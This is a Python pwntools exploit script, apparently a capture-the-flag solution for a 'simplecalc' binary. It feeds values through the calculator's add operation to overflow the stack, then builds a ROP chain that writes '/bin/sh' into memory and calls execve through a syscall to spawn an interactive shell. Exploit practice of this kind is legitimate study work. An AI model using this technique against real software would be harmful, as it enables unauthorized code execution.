from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

bin_name = './simplecalc'

elf = ELF(bin_name)
io = process(bin_name)
# io = gdb.debug(bin_name,'''
# start
# bp 0x000000000040154a
# c
# ''')

io.sendlineafter(b"Expected number of calculations:", b"100")

# input 4 bytes 
def addSingle(input):
    io.sendlineafter(b"=> ", b"1")
    io.sendlineafter(b"Integer x: ", b"12342")
    io.sendlineafter(b"Integer y: ", str(input-12342).encode())

# input 8 bytes
def add(input):
    least = input & 0xffffffff
    most = (input & 0xffffffff00000000) >> 32
    # least first
    addSingle(least)
    # most after
    addSingle(most)

# padding 0x48 bytes
for _ in range(9):
    add(0)

poprax = ROP(elf).find_gadget(["pop rax", "ret"])[0]
poprdi = ROP(elf).find_gadget(["pop rdi", "ret"])[0]
poprsi = ROP(elf).find_gadget(["pop rsi", "ret"])[0]
poprdx = ROP(elf).find_gadget(["pop rdx", "ret"])[0]
syscall = ROP(elf).find_gadget(["syscall"])[0]

# -----------------------------
# write string "/bin/sh\0" to
# a random space with w permission and full 0 bytes

# ROPgadget --binary ./simplecalc | grep "ret" | grep ": mov qword ptr"
# 0x000000000044526e : mov qword ptr [rax], rdx ; ret
mov = 0x000000000044526e

binsh = 0x6c1000 # random writable address

# rax = 0x6c1000 
add(poprax)
add(binsh)
# rdx = "/bin/sh\x00"
add(poprdx)
add(int.from_bytes(b"\x00hs/nib/"))
# mov qword ptr [rax], rdx; ret
add(mov)
# ------------END--------------

#-------ROP TO SYSCALL---------

# syscall sys_execve
# rax: 59
# rdi: address of command
# rsi: 0
# rdx: 0

#-------------BEGIN------------
# rax = 59
add(poprax)
add(59)
# rdi = 0x6c1000
add(poprdi)
add(binsh)
# rsi = 0
add(poprsi)
add(0)
# rdx = 0
add(poprdx)
add(0)
# syscall
add(syscall)
#-------------END--------------

io.sendlineafter(b"=> ", b"5")
io.interactive()